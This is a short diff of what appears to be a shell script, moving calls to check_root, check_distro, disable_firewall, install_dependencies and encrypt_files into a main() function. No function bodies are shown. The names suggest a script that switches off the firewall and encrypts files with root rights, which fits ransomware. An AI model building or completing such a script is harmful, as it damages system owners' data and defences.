@@ -102,8 +102,12 @@ encrypt_files() {
     done
 }
 
-check_root
-check_distro
-disable_firewall
-install_dependencies
-encrypt_files
+main() {
+    check_root
+    check_distro
+    disable_firewall
+    install_dependencies
+	encrypt_files
+}
+
+main
